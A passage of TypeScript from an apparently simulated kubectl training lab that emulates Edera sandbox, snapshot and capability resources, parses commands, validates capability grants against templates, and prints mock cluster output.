        `Command ran inside the ${podName} Edera zone`,
      );
      return true;
    }

    if (verb !== "get" && verb !== "describe" && verb !== "delete") return false;

    // Split args into the resource token and positional names, skipping
    // flag values such as `-n default` or `-o yaml`.
    const args = tokens.slice(2);
    const resourceToken = args[0] || "";
    const names: string[] = [];
    let output = "";
    let namespace = "default";
    for (let i = 1; i < args.length; i++) {
      const token = args[i];
      if (token === "-n" || token === "--namespace") {
        namespace = args[++i] || namespace;
      } else if (token === "-o" || token === "--output") {
        output = args[++i] || "";
      } else if (token.startsWith("-o")) {
        output = token.replace(/^-o=?/, "");
      } else if (token.startsWith("--output=")) {
        output = token.split("=")[1] || "";
      } else if (!token.startsWith("-")) {
        names.push(token);
      }
    }

    // kubectl get crd sandboxes.runtime.edera.dev ...
    if (
      verb === "get" &&
      ["crd", "crds", "customresourcedefinition", "customresourcedefinitions"].includes(
        resourceToken.toLowerCase(),
      ) &&
      names.length > 0 &&
      names.every((name) => name.endsWith(".runtime.edera.dev"))
    ) {
      const missing = names.find((name) => !EDERA_CRD_NAMES.includes(name));
      if (missing) {
        printEderaError(
          `Error from server (NotFound): customresourcedefinitions.apiextensions.k8s.io "${missing}" not found`,
        );
        return true;
      }
      printPre(
        formatTerminalTable(
          ["NAME", "CREATED AT"],
          names.map((name) => [{ text: name, color: "#b8ff3c" }, "10m"]),
        ) + `\n\n<span style="color:#00e5d4;">runtime.edera.dev/v1alpha1 served=true</span>`,
      );
      if (names.some((name) => name.startsWith("sandboxes."))) {
        markDemoStepComplete("edera-crds");
      }
      if (
        ["capabilityproviders.", "sandboxtemplates.", "sandboxsessions."].every((prefix) =>
          names.some((name) => name.startsWith(prefix)),
        )
      ) {
        markDemoStepComplete("capability-crds");
      }
      return true;
    }

    // Support `kubectl get sandbox,snapshot,fork` and `...,pods`, as long as
    // every non-pod entry is one of ours; other lists fall through.
    if (resourceToken.includes("/")) {
      names.push(resourceToken.split("/")[1]);
    }
    const resourceParts = (
      resourceToken.includes("/") ? resourceToken.split("/")[0] : resourceToken
    )
      .split(",")
      .filter(Boolean);
    const includePods = resourceParts.some((part) =>
      ["pod", "pods", "po"].includes(part.toLowerCase()),
    );
    const kindParts = resourceParts.filter(
      (part) => !["pod", "pods", "po"].includes(part.toLowerCase()),
    );
    if (kindParts.length === 0) return false;
    if (includePods && verb !== "get") return false;

    const kinds = kindParts.map((part) => resolveEderaRuntimeKind(part, names));
    if (kinds.some((kind) => kind === null)) return false;
    const resolvedKinds = kinds as EderaRuntimeKind[];
    const allNamespaces = tokens.includes("-A") || tokens.includes("--all-namespaces");
    const deleteAll = tokens.includes("--all");

    if (!allNamespaces && namespace !== "default") {
      printHtml(
        `<span style="color:#a8cfca;">No resources found in ${escapeHtml(namespace)} namespace.</span>`,
      );
      return true;
    }

    // Named lookups: each name must match an existing resource of a listed kind.
    for (const name of names) {
      const match = resolvedKinds.find(
        (kind) => EDERA_RUNTIME_MANIFESTS[kind].name === name && ederaExists(kind),
      );
      if (!match) {
        printEderaError(
          `Error from server (NotFound): ${resolvedKinds[0].toLowerCase()}s.runtime.edera.dev "${name}" not found`,
        );
        return true;
      }
    }

    const selectedKinds = (
      names.length
        ? resolvedKinds.filter((kind) => names.includes(EDERA_RUNTIME_MANIFESTS[kind].name))
        : resolvedKinds
    ).filter(ederaExists);

    if (verb === "delete") {
      if (!names.length && !deleteAll) {
        printEderaError("error: resource(s) were provided, but no name was specified");
        return true;
      }
      if (selectedKinds.length === 0) {
        printHtml(`<span style="color:#a8cfca;">No resources found</span>`);
        return true;
      }
      for (const kind of selectedKinds) deleteEderaRuntimeResource(kind);
      updateDashboard();
      if (ederaCreatedAt.size === 0) markDemoStepComplete("edera-cleanup");
      return true;
    }

    if (selectedKinds.length === 0) {
      printHtml(`<span style="color:#a8cfca;">No resources found in default namespace.</span>`);
      return true;
    }

    if (verb === "describe") {
      printPre(highlightDescribe(selectedKinds.map(ederaRuntimeDescribe).join("\n\n\n")));
    } else if (output === "yaml") {
      printPre(
        escapeHtml(
          selectedKinds.map((kind) => EDERA_RUNTIME_MANIFESTS[kind].yaml).join("\n---\n"),
        ),
      );
    } else {
      const sections = selectedKinds.map(ederaRuntimeTable);
      if (includePods) {
        // Show the pods behind the listed resources.
        const related = ederaManagedPods().filter(
          (pod) =>
            (selectedKinds.includes("Sandbox") && isEderaSandboxPod(pod)) ||
            (selectedKinds.includes("Fork") && isEderaForkPod(pod)),
        );
        if (related.length) sections.push(ederaPodTable(related));
      }
      printPre(sections.join("\n\n"));
    }

    if (selectedKinds.includes("Sandbox") && ederaSandboxReady) {
      markDemoStepComplete("edera-sandbox-inspect");
    }
    if (selectedKinds.includes("Snapshot")) markDemoStepComplete("edera-snapshot-inspect");
    if (selectedKinds.includes("Fork")) markDemoStepComplete("edera-fork-inspect");
    return true;
  };

  // -----------------------------------------------------------------------
  // CapabilityProvider / SandboxTemplate / SandboxSession (runtime.edera.dev).
  // A provider publishes several capabilities from one pod. A template grants
  // a subset of a provider's capabilities; a session selects a provider and a
  // subset of what its template grants. The controller turns each session
  // into a pod in its own Edera zone whose workload consumes exactly those.
  // -----------------------------------------------------------------------
  type CapabilityKind = "CapabilityProvider" | "SandboxTemplate" | "SandboxSession";

  // Server-side metadata shown by `kubectl describe`.
  interface RuntimeObjectMeta {
    createdAt: number;
    uid: string;
    resourceVersion: string;
    source: string;
    spec: YamlMap;
  }
  interface CapabilityProviderState extends RuntimeObjectMeta {
    provider?: CapabilityProviderSpec;
    podName?: string;
  }
  interface SandboxTemplateState extends RuntimeObjectMeta {
    grants: CapabilityGrant[];
    image: string;
    profileHash: string;
  }
  interface SandboxSessionState extends RuntimeObjectMeta {
    template: string;
    grants: CapabilityGrant[];
  }

  const capabilityProviders = new Map<string, CapabilityProviderState>();
  // Secrets created with `kubectl create secret generic` (name -> keys).
  // The lab starts with the github provider's token Secret already created,
  // as on a cluster someone has set up beforehand.
  const clusterSecrets = new Map<string, { keys: string[]; createdAt: number }>([
    [CAPABILITY_SECRET_NAME, { keys: ["token"], createdAt: Date.now() - 10 * 60 * 1000 }],
  ]);
  const sandboxTemplates = new Map<string, SandboxTemplateState>();
  const sandboxSessions = new Map<string, SandboxSessionState>();

  const CAPABILITY_PLURALS: Record<CapabilityKind, string> = {
    CapabilityProvider: "capabilityproviders",
    SandboxTemplate: "sandboxtemplates",
    SandboxSession: "sandboxsessions",
  };
  const CAPABILITY_FINALIZERS: Partial<Record<CapabilityKind, string>> = {
    CapabilityProvider: "capabilities.edera.dev",
    SandboxSession: "sandboxsessions.edera.dev",
  };

  const randomHex = (length: number) =>
    Array.from({ length }, () => Math.floor(Math.random() * 16).toString(16)).join("");
  const newUid = () =>
    `${randomHex(8)}-${randomHex(4)}-4${randomHex(3)}-${"89ab"[Math.floor(Math.random() * 4)]}${randomHex(3)}-${randomHex(12)}`;
  let runtimeResourceVersion = 43646000 + Math.floor(Math.random() * 500);
  const objectMeta = (doc: Pick<RuntimeManifestDoc, "source" | "spec">): RuntimeObjectMeta => ({
    createdAt: Date.now(),
    uid: newUid(),
    resourceVersion: String((runtimeResourceVersion += 1 + Math.floor(Math.random() * 400))),
    source: doc.source,
    spec: doc.spec,
  });
  const isoTime = (time: number) => new Date(time).toISOString().replace(/\.\d{3}Z$/, "Z");

  const resolveCapabilityKind = (token: string): CapabilityKind | null => {
    const [base, ...group] = token.toLowerCase().split(".");
    const groupName = group.join(".");
    if (groupName && groupName !== "runtime.edera.dev") return null;
    if (["capabilityprovider", "capabilityproviders"].includes(base)) return "CapabilityProvider";
    if (["sandboxtemplate", "sandboxtemplates"].includes(base)) return "SandboxTemplate";
    if (["sandboxsession", "sandboxsessions"].includes(base)) return "SandboxSession";
    return null;
  };

  const capabilityRef = (kind: CapabilityKind, name: string) =>
    `${kind.toLowerCase()}.runtime.edera.dev/${name}`;

  const ageSince = (created: number) => {
    const seconds = Math.max(1, Math.floor((Date.now() - created) / 1000));
    return seconds < 120 ? `${seconds}s` : `${Math.floor(seconds / 60)}m`;
  };

  const isSessionPod = (pod: LocalPod, session?: string) =>
    session
      ? pod.labels["runtime.edera.dev/session"] === session
      : pod.labels["runtime.edera.dev/session"] !== undefined;

  // Sessions currently consuming a provider's capability (any, if omitted).
  const sessionsUsing = (provider: string, capability?: string) =>
    [...sandboxSessions.entries()]
      .filter(([, session]) =>
        session.grants.some(
          (grant) =>
            grant.provider === provider &&
            (!capability || grant.capabilities.includes(capability)),
        ),
      )
      .map(([name]) => name);

  const templatesGranting = (provider: string, capability?: string) =>
    [...sandboxTemplates.entries()]
      .filter(([, template]) =>
        template.grants.some(
          (grant) =>
            grant.provider === provider &&
            (!capability || grant.capabilities.includes(capability)),
        ),
      )
      .map(([name]) => name);

  const capabilityPodName = (provider: string) => `edera-capability-${provider}`;

  const capabilityPublishAnnotation = (provider: CapabilityProviderSpec) =>
    Object.entries(provider.publishes)
      .map(([name, command]) => `${name}=${JSON.stringify(command)}`)
      .join(",");

  // The controller runs a provider's pod spec as an Edera pod. Once it's
  // running, its workload publishes every entry in spec.capabilities.
  const createCapabilityProviderPod = (providerName: string, state: CapabilityProviderState) => {
    const provider = state.provider!;
    const name = capabilityPodName(providerName);
    state.podName = name;
    pods.push({
      name,
      namespace: "default",
      status: "ContainerCreating",
      age: "1s",
      image: provider.image,
      ip: "<none>",
      node: EDERA_SANDBOX_NODE,
      labels: { ...provider.labels },
      runtimeClassName: "edera",
    });
    addEvent(
      "Normal",
      "Scheduled",
      `pod/${name}`,
      `Successfully assigned default/${name} to ${EDERA_SANDBOX_NODE}`,
    );
    reconcileCapabilityProviders();
  };

  // Start provider pods whose Secret now exists.
  const reconcileCapabilityProviders = () => {
    for (const [providerName, state] of capabilityProviders) {
      if (!state.provider || !state.podName) continue;
      const pod = pods.find((item) => item.name === state.podName);
      if (!pod || pod.status === "Running") continue;
      const secret = state.provider.secretName;
      if (secret && !clusterSecrets.has(secret)) {
        if (!clusterEvents.some((event) => event.reason === "FailedMount" && event.object === `pod/${pod.name}`)) {
          addEvent(
            "Warning",
            "FailedMount",
            `pod/${pod.name}`,
            `MountVolume.SetUp failed for volume "token" : secret "${secret}" not found`,
          );
        }
        continue;
      }
      pod.status = "Running";
      pod.ip = nextWorkloadPodIp();
      startEderaZoneForPod(pod);
      const workload = protectWorkloads.find((item) => item.sourcePodName === pod.name);
      if (workload) {
        workload.ocapPublished = Object.keys(state.provider.publishes);
        workload.ocapPublishCommands = { ...state.provider.publishes };
        if (state.provider.mountPath) {
          workload.mounts = [
            {
              source: secret ? `secret/${secret}` : "",
              destination: state.provider.mountPath,
              readOnly: state.provider.readOnly,
            },
          ];
        }
      }
      addEvent("Normal", "Started", `pod/${pod.name}`, `Started container ${state.provider.container}`);
      for (const published of Object.keys(state.provider.publishes)) {
        addEvent(
          "Normal",
          "OcapPublished",
          `capabilityprovider/${providerName}`,
          `Pod ${pod.name} published object capability ${published}`,
        );
      }
    }
    updateDashboard();
  };

  const isCapabilityProviderPod = (podName: string) =>
    [...capabilityProviders.values()].some((state) => state.podName === podName);

  const describeCapabilityPod = (podName: string): string | undefined => {
    const entry = [...capabilityProviders.entries()].find(([, state]) => state.podName === podName);
    const pod = pods.find((item) => item.name === podName);
    if (!entry || !pod) return undefined;
    const [providerName, state] = entry;
    const provider = state.provider!;
    const running = pod.status === "Running";
    const started = new Date(state.createdAt).toUTCString().replace("GMT", "+0000");
    const events = clusterEvents.filter((event) => event.object === `pod/${podName}`);
    const labels = Object.entries(provider.labels).map(([key, value]) => `${key}=${value}`);
    return [
      `Name:                ${pod.name}`,
      `Namespace:           ${pod.namespace}`,
      `Priority:            0`,
      `Runtime Class Name:  edera`,
      `Service Account:     ${yamlString(yamlMap(state.spec.spec).serviceAccountName) || "default"}`,
      `Node:                ${(() => {
        const node = nodes.find((item) => item.name === pod.node);
        return node ? `${node.name}/${node.internalIp}` : pod.node;
      })()}`,
      `Start Time:          ${started}`,
      `Labels:              ${labels[0] || "<none>"}`,
      ...labels.slice(1).map((label) => `                     ${label}`),
      `Annotations:         dev.edera/ocap-publish: ${capabilityPublishAnnotation(provider)}`,
      `Status:              ${running ? "Running" : "Pending"}`,
      `IP:                  ${running ? pod.ip : ""}`,
      `Controlled By:       CapabilityProvider/${providerName}`,
      `Containers:`,
      `  ${provider.container}:`,
      `    Image:          ${provider.image}`,
      `    State:          ${running ? "Running" : "Waiting"}`,
      ...(running ? [] : [`      Reason:       ContainerCreating`]),
      `    Ready:          ${running ? "True" : "False"}`,
      `    Restart Count:  0`,
      `    Mounts:`,
      ...(provider.mountPath
        ? [`      ${provider.mountPath} from token (${provider.readOnly ? "ro" : "rw"},path="token")`]
        : []),
      `Volumes:`,
      ...(provider.secretName
        ? [
            `  token:`,
            `    Type:        Secret (a volume populated by a Secret)`,
            `    SecretName:  ${provider.secretName}`,
            `    Optional:    false`,
          ]
        : []),
      `Events:`,
      `  Type     Reason        Age   From     Message`,
      `  ----     ------        ----  ----     -------`,
      ...events
        .slice(0, 6)
        .reverse()
        .map((event) => `  ${event.type.padEnd(8)} ${event.reason.padEnd(13)} ${event.time.padEnd(5)} kubelet  ${event.message}`),
    ].join("\n");
  };

  // Checks a list of grants against what's allowed. Returns an error message
  // for the first grant that isn't, or undefined if all of them are.
  const findUngrantedCapability = (
    grants: CapabilityGrant[],
    allowed: (provider: string) => string[] | undefined,
    scope: string,
  ): string | undefined => {
    for (const grant of grants) {
      const available = allowed(grant.provider);
      if (!available) return `provider "${grant.provider}" ${scope.startsWith("by template") ? `is not granted ${scope}` : "not found"}`;
      const missing = grant.capabilities.find((cap) => !available.includes(cap));
      if (missing) {
        return scope.startsWith("by template")
          ? `capability "${missing}" from provider "${grant.provider}" is not granted ${scope}`
          : `provider "${grant.provider}" does not provide capability "${missing}"`;
      }
    }
    return undefined;
  };

  const applyCapabilityDoc = (doc: RuntimeManifestDoc, sourceFile: string): boolean => {
    if (doc.kind === "CapabilityProvider") {
      if (capabilityProviders.has(doc.name)) {
        printHtml(`<span style="color:#a8cfca;">${escapeHtml(capabilityRef("CapabilityProvider", doc.name))} unchanged</span>`);
        return true;
      }
      const state: CapabilityProviderState = { ...objectMeta(doc), provider: doc.provider };
      capabilityProviders.set(doc.name, state);
      addEvent(
        "Normal",
        "ProviderAccepted",
        `capabilityprovider/${doc.name}`,
        `CapabilityProvider ${doc.name} accepted (${Object.keys(doc.provider?.publishes || {}).join(", ")})`,
      );
      printHtml(`<span style="color:#b8ff3c;">${escapeHtml(capabilityRef("CapabilityProvider", doc.name))} created</span>`);
      if (doc.provider) createCapabilityProviderPod(doc.name, state);
      if (doc.name === GITHUB_PROVIDER_NAME) markDemoStepComplete("provider-apply");
      if (doc.name === KUBERNETES_PROVIDER_NAME) markDemoStepComplete("kubernetes-provider-apply");
      return true;
    }

    if (doc.kind === "SandboxTemplate") {
      if (sandboxTemplates.has(doc.name)) {
        printHtml(`<span style="color:#a8cfca;">${escapeHtml(capabilityRef("SandboxTemplate", doc.name))} unchanged</span>`);
        return true;
      }
      const problem = findUngrantedCapability(
        doc.grants,
        (provider) => {
          const state = capabilityProviders.get(provider);
          return state ? Object.keys(state.provider?.publishes || {}) : undefined;
        },
        "in the cluster",
      );
      if (problem) {
        printEderaError(
          `Error from server (Invalid): error when creating "${sourceFile}": SandboxTemplate.runtime.edera.dev "${doc.name}" is invalid: spec.capabilities: ${problem}`,
        );
        return false;
      }
      sandboxTemplates.set(doc.name, {
        ...objectMeta(doc),
        grants: doc.grants,
        image: doc.image || "registry.k8s.io/pause:latest",
        profileHash: randomHex(16),
      });
      addEvent(
        "Normal",
        "SandboxTemplateIsValid",
        `sandboxtemplate/${doc.name}`,
        `Template ${doc.name} grants ${formatGrants(doc.grants)}`,
      );
      printHtml(`<span style="color:#b8ff3c;">${escapeHtml(capabilityRef("SandboxTemplate", doc.name))} created</span>`);
      markDemoStepComplete("template-apply");
      return true;
    }

    if (doc.kind === "SandboxSession") {
      return createSandboxSession(doc, sourceFile);
    }

    return false;
  };

  const createSandboxSession = (doc: RuntimeManifestDoc, sourceFile: string): boolean => {
    const { name } = doc;
    const templateName = doc.templateRef || "";
    if (sandboxSessions.has(name)) {
      printHtml(`<span style="color:#a8cfca;">${escapeHtml(capabilityRef("SandboxSession", name))} unchanged</span>`);
      return true;
    }
    const template = sandboxTemplates.get(templateName);
    if (!template) {
      printEderaError(
        `Error from server (NotFound): error when creating "${sourceFile}": sandboxtemplates.runtime.edera.dev "${templateName}" not found`,
      );
      return false;
    }
    const problem = findUngrantedCapability(
      doc.grants,
      (provider) => {
        const grants = template.grants.filter((grant) => grant.provider === provider);
        return grants.length ? grants.flatMap((grant) => grant.capabilities) : undefined;
      },
      `by template "${templateName}"`,
    );
    if (problem) {
      printEderaError(
        `Error from server (Forbidden): error when creating "${sourceFile}": sandboxsessions.runtime.edera.dev "${name}" is forbidden: ${problem} (allowed: ${formatGrants(template.grants)})`,
      );
      addEvent("Warning", "CapabilityNotGranted", `sandboxsession/${name}`, `Template ${templateName}: ${problem}`);
      if (name === SANDBOX_SESSION_DENIED_NAME) markDemoStepComplete("session-denied");
      return false;
    }
    const missing = doc.grants.find((grant) => !capabilityProviders.has(grant.provider));
    if (missing) {
      printEderaError(
        `Error from server (NotFound): error when creating "${sourceFile}": capabilityproviders.runtime.edera.dev "${missing.provider}" not found`,
      );
      return false;
    }

    sandboxSessions.set(name, { ...objectMeta(doc), template: templateName, grants: doc.grants });

    const pod: LocalPod = {
      name,
      namespace: "default",
      status: "Running",
      age: "1s",
      image: template.image,
      ip: nextWorkloadPodIp(),
      node: EDERA_SANDBOX_NODE,
      labels: {
        "runtime.edera.dev/session": name,
        "runtime.edera.dev/template": templateName,
      },
      runtimeClassName: "edera",
    };
    pods.push(pod);
    startEderaZoneForPod(pod);
    const consumed = doc.grants.flatMap((grant) => grant.capabilities);
    const workload = protectWorkloads.find((item) => item.sourcePodName === name);
    if (workload) workload.ocapConsumed = [...consumed];

    addEvent("Normal", "SessionCreated", `sandboxsession/${name}`, `Created zone ${name} from template ${templateName}`);
    for (const grant of doc.grants) {
      for (const cap of grant.capabilities) {
        addEvent("Normal", "OcapConsumed", `workload/${name}`, `Session ${name} consumes ${cap} from provider ${grant.provider}`);
      }
    }
    printHtml(`<span style="color:#b8ff3c;">${escapeHtml(capabilityRef("SandboxSession", name))} created</span>`);
    if (name === SANDBOX_SESSION_NAME) markDemoStepComplete("session-apply");
    return true;
  };

  const capabilityStore = (kind: CapabilityKind): Map<string, RuntimeObjectMeta> =>
    kind === "CapabilityProvider"
      ? capabilityProviders
      : kind === "SandboxTemplate"
        ? sandboxTemplates
        : sandboxSessions;

  const deleteCapabilityObject = (kind: CapabilityKind, name: string): boolean => {
    const store = capabilityStore(kind);
    if (!store.has(name)) return false;
    if (kind === "CapabilityProvider") {
      const podName = capabilityProviders.get(name)?.podName;
      if (podName) removeEderaPods((pod) => pod.name === podName);
    }
    store.delete(name);
    if (kind === "SandboxSession") {
      removeEderaPods((pod) => isSessionPod(pod, name));
      if (name === SANDBOX_SESSION_NAME) markDemoStepComplete("session-cleanup");
    }
    addEvent("Normal", `${kind}Deleted`, `${kind.toLowerCase()}/${name}`, `${kind} ${name} deleted`);
    printHtml(
      `<span style="color:#b8ff3c;">${kind.toLowerCase()}.runtime.edera.dev "${escapeHtml(name)}" deleted</span>`,
    );
    return true;
  };

  const capabilityNames = (kind: CapabilityKind) => [...capabilityStore(kind).keys()].sort();

  const capabilityTable = (kind: CapabilityKind, names: string[]) => {
    if (kind === "CapabilityProvider") {
      return formatTerminalTable(
        ["NAME", "CAPABILITIES", "POD", "AGE"],
        names.map((name) => {
          const state = capabilityProviders.get(name)!;
          return [
            { text: name, color: "#b8ff3c" },
            Object.keys(state.provider?.publishes || {}).join(","),
            state.podName || "",
            ageSince(state.createdAt),
          ];
        }),
      );
    }
    if (kind === "SandboxTemplate") {
      return formatTerminalTable(
        ["NAME", "CAPABILITIES", "ACCEPTED", "AGE"],
        names.map((name) => {
          const template = sandboxTemplates.get(name)!;
          return [
            { text: name, color: "#b8ff3c" },
            formatGrants(template.grants),
            "True",
            ageSince(template.createdAt),
          ];
        }),
      );
    }
    return formatTerminalTable(
      ["NAME", "TEMPLATE", "CAPABILITIES", "READY", "AGE"],
      names.map((name) => {
        const session = sandboxSessions.get(name)!;
        return [
          { text: name, color: "#b8ff3c" },
          session.template,
          formatGrants(session.grants),
          "True",
          ageSince(session.createdAt),
        ];
      }),
    );
  };

  const capabilityDescribe = (kind: CapabilityKind, name: string) => {
    const state = capabilityStore(kind).get(name)!;
    const finalizer = CAPABILITY_FINALIZERS[kind];
    const metadata: YamlMap = {
      creationTimestamp: isoTime(state.createdAt),
      ...(finalizer ? { finalizers: [finalizer] } : {}),
      generation: 1,
      resourceVersion: state.resourceVersion,
      uid: state.uid,
    };
    const lines = [
      `Name:\t${name}`,
      `Namespace:\tdefault`,
      `Labels:\t<none>`,
      `Annotations:\t<none>`,
      `API Version:\truntime.edera.dev/v1alpha1`,
      `Kind:\t${kind}`,
      `Metadata:`,
      ...describeValueLines(metadata, 2),
      `Spec:`,
      ...describeValueLines(state.spec, 2),
    ];
    if (kind === "SandboxTemplate") {
      const template = state as SandboxTemplateState;
      lines.push(
        `Status:`,
        ...describeValueLines(
          {
            conditions: [
              {
                lastTransitionTime: isoTime(template.createdAt),
                message: "Sandbox Template has been validated",
                observedGeneration: 1,
                reason: "SandboxTemplateIsValid",
                status: "True",
                type: "Accepted",
              },
            ],
            observedGeneration: 1,
            profileHash: template.profileHash,
          },
          2,
        ),
      );
    }
    lines.push(`Events:\t<none>`);
    return alignDescribeColumns(lines);
  };

  const handleCapabilityResources = (tokens: string[]): boolean => {
    const verb = tokens[1];

    // kubectl create secret generic NAME --from-file=KEY=PATH
    if (verb === "create" && tokens[2] === "secret") {
      const name = tokens[4] || "";
      if (tokens[3] !== "generic" || !name) {
        printEderaError("error: this lab supports: kubectl create secret generic NAME --from-file=KEY=PATH");
        return true;
      }
      if (clusterSecrets.has(name)) {
        printEderaError(`error: failed to create secret secrets "${name}" already exists`);
        return true;
      }
      const keys: string[] = [];
      for (let i = 5; i < tokens.length; i++) {
        const value = tokens[i].startsWith("--from-file=")
          ? tokens[i].slice("--from-file=".length)
          : tokens[i] === "--from-file"
            ? tokens[++i] || ""
            : "";
        if (!value) continue;
        const [key, path] = value.includes("=") ? value.split("=") : [value.split("/").pop()!, value];
        if (!HOST_FILES.has(path) && getVirtualFile(resolveVirtualPath(path)) === undefined) {
          printEderaError(`error: error reading ${path}: no such file or directory`);
          return true;
        }
        keys.push(key);
      }
      if (keys.length === 0) {
        printEderaError("error: at least one --from-file=KEY=PATH is required");
        return true;
      }
      clusterSecrets.set(name, { keys, createdAt: Date.now() });
      addEvent("Normal", "SecretCreated", `secret/${name}`, `Secret ${name} created with keys ${keys.join(", ")}`);
      printHtml(`<span style="color:#b8ff3c;">secret/${escapeHtml(name)} created</span>`);
      if (name === CAPABILITY_SECRET_NAME) markDemoStepComplete("capability-secret");
      reconcileCapabilityProviders();
      return true;
    }

    // kubectl get secret(s) [NAME]
    if (verb === "get" && ["secret", "secrets"].includes(tokens[2] || "")) {
      const names = tokens.slice(3).filter((token) => !token.startsWith("-"));
      const selected = [...clusterSecrets.entries()].filter(
        ([name]) => names.length === 0 || names.includes(name),
      );
      const missing = names.find((name) => !clusterSecrets.has(name));
      if (missing) {
        printEderaError(`Error from server (NotFound): secrets "${missing}" not found`);
      } else if (selected.length === 0) {
        printHtml(`<span style="color:#a8cfca;">No resources found in default namespace.</span>`);
      } else {
        printPre(
          formatTerminalTable(
            ["NAME", "TYPE", "DATA", "AGE"],
            selected.map(([name, secret]) => [
              { text: name, color: "#b8ff3c" },
              "Opaque",
              String(secret.keys.length),
              ageSince(secret.createdAt),
            ]),
          ),
        );
      }
      return true;
    }

    // kubectl describe po|pod|pods edera-capability-<name>
    if (
      verb === "describe" &&
      ["po", "pod", "pods"].includes(tokens[2] || "") &&
      tokens[3] &&
      isCapabilityProviderPod(tokens[3])
    ) {
      printPre(highlightDescribe(describeCapabilityPod(tokens[3])!));
      markDemoStepComplete("capability-pod");
      return true;
    }

    // kubectl apply|delete -f examples/<file>.yaml
    if ((verb === "apply" || verb === "delete") && tokens.includes("-f")) {
      const files = tokens
        .map((token, index) => (tokens[index - 1] === "-f" ? token : null))
        .filter((token): token is string => token !== null);
      const resolved = files.map((file) => {
        const yaml = getVirtualFile(resolveVirtualPath(file.replace(/^['"]|['"]$/g, "")));
        const docs = yaml ? parseRuntimeManifest(yaml) : [];
        return { file, docs };
      });
      const ours = resolved.every(
        ({ docs }) =>
          docs.length > 0 &&
          docs.every((doc) => ["CapabilityProvider", "SandboxTemplate", "SandboxSession"].includes(doc.kind)),
      );
      if (resolved.length === 0 || !ours) return false;

      for (const { file, docs } of resolved) {
        for (const doc of docs) {
          if (verb === "apply") {
            applyCapabilityDoc(doc, file);
          } else if (!deleteCapabilityObject(doc.kind as CapabilityKind, doc.name)) {
            printEderaError(
              `Error from server (NotFound): ${CAPABILITY_PLURALS[doc.kind as CapabilityKind]}.runtime.edera.dev "${doc.name}" not found`,
            );
          }
        }
      }
      updateDashboard();
      return true;
    }

    if (verb !== "get" && verb !== "describe" && verb !== "delete") return false;

    const args = tokens.slice(2);
    let resourceToken = args[0] || "";
    const names: string[] = [];
    let output = "";
    for (let i = 1; i < args.length; i++) {
      const token = args[i];
      if (token === "-n" || token === "--namespace") i++;
      else if (token === "-o" || token === "--output") output = args[++i] || "";
      else if (token.startsWith("-o")) output = token.replace(/^-o=?/, "");
      else if (token.startsWith("--output=")) output = token.split("=")[1] || "";
      else if (!token.startsWith("-")) names.push(token);
    }
    if (resourceToken.includes("/")) {
      names.push(resourceToken.split("/")[1]);
      resourceToken = resourceToken.split("/")[0];
    }

    const parts = resourceToken.split(",").filter(Boolean);
    const includePods = parts.some((part) => ["pod", "pods", "po"].includes(part.toLowerCase()));
    const kindParts = parts.filter((part) => !["pod", "pods", "po"].includes(part.toLowerCase()));
    if (kindParts.length === 0) return false;
    const kinds = kindParts.map(resolveCapabilityKind);
    if (kinds.some((kind) => kind === null)) {
      // The resource used to be called Capability.
      if (kindParts.some((part) => /^capabilit(y|ies)(\.runtime\.edera\.dev)?$/i.test(part))) {
        printEderaError(
          `error: the server doesn't have a resource type "${kindParts[0]}" (did you mean capabilityproviders?)`,
        );
        return true;
      }
      return false;
    }
    if (includePods && verb !== "get") return false;
    const resolvedKinds = kinds as CapabilityKind[];

    if (verb === "delete") {
      const deleteAll = tokens.includes("--all");
      if (!names.length && !deleteAll) {
        printEderaError("error: resource(s) were provided, but no name was specified");
        return true;
      }
      for (const kind of resolvedKinds) {
        const targets = deleteAll ? capabilityNames(kind) : names;
        if (deleteAll && targets.length === 0) {
          printHtml(`<span style="color:#a8cfca;">No resources found</span>`);
        }
        for (const name of targets) {
          if (!deleteCapabilityObject(kind, name)) {
            printEderaError(
              `Error from server (NotFound): ${CAPABILITY_PLURALS[kind]}.runtime.edera.dev "${name}" not found`,
            );
          }
        }
      }
      updateDashboard();
      return true;
    }

    const sections: string[] = [];
    const yamlDocs: string[] = [];
    const describes: string[] = [];
    for (const kind of resolvedKinds) {
      const existing = capabilityNames(kind);
      for (const name of names) {
        if (!existing.includes(name) && resolvedKinds.length === 1) {
          printEderaError(
            `Error from server (NotFound): ${CAPABILITY_PLURALS[kind]}.runtime.edera.dev "${name}" not found`,
          );
          return true;
        }
      }
      const selected = names.length ? existing.filter((name) => names.includes(name)) : existing;
      if (selected.length === 0) continue;

      if (verb === "describe") {
        describes.push(...selected.map((name) => capabilityDescribe(kind, name)));
        if (kind === "CapabilityProvider" && selected.includes(GITHUB_PROVIDER_NAME)) {
          markDemoStepComplete("provider-describe");
        }
        if (kind === "SandboxTemplate" && selected.includes(SANDBOX_TEMPLATE_NAME)) {
          markDemoStepComplete("template-describe");
        }
        if (kind === "SandboxSession" && selected.includes(SANDBOX_SESSION_NAME)) {
          markDemoStepComplete("session-describe");
        }
      } else if (output === "yaml") {
        yamlDocs.push(...selected.map((name) => capabilityStore(kind).get(name)!.source));
      } else {
        sections.push(capabilityTable(kind, selected));
      }

      if (kind === "CapabilityProvider" && verb === "get" && selected.includes(GITHUB_PROVIDER_NAME)) {
        markDemoStepComplete("provider-list");
      }
      if (kind === "SandboxSession" && verb === "get" && selected.includes(SANDBOX_SESSION_NAME)) {
        markDemoStepComplete("session-inspect");
      }
    }

    if (includePods && verb === "get" && output !== "yaml") {
      const related = pods.filter((pod) => isSessionPod(pod));
      if (related.length) sections.push(ederaPodTable(related));
    }

    if (verb === "describe" && describes.length) {
      printPre(highlightDescribe(describes.join("\n\n\n")));
    } else if (yamlDocs.length) {
      printPre(escapeHtml(yamlDocs.join("\n---\n")));
    } else if (sections.length) {
      printPre(sections.join("\n\n"));
    } else {
      printHtml(`<span style="color:#a8cfca;">No resources found in default namespace.</span>`);
    }
    return true;
  };

  // `python3 examples/session.py`: what the SDK's context manager does.
  const runSandboxSdk = async () => {
    const templateName = SANDBOX_TEMPLATE_NAME;
    const grants: CapabilityGrant[] = [{ provider: GITHUB_PROVIDER_NAME, capabilities: [README_CAPABILITY] }];
    const suffix = Math.random().toString(36).slice(2, 7);
    const sessionName = `${templateName}-${suffix}`;
    const generated = `apiVersion: runtime.edera.dev/v1alpha1
kind: SandboxSession
metadata:
  generateName: ${templateName}-
  name: ${sessionName}
spec:
  capabilities:
${grants
  .map(
    (grant) =>
      `    - provider: ${grant.provider}\n      capabilities:\n${grant.capabilities.map((cap) => `        - ${cap}`).join("\n")}`,
  )
  .join("\n")}
  templateRef:
    name: ${templateName}`;
